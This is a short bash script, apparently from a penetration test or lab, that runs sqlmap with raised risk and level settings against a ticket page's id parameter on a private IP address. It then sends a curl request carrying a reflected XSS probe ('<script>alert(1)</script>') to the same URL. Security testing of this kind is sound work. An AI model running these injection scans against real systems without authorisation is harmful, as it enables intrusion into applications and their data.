#!/bin/bash
set -e
sqlmap -u "https://10.20.0.10/tickets?id=1" --batch --risk=2 --level=2 || true
curl -k "https://10.20.0.10/tickets?id=1<script>alert(1)</script>" || true
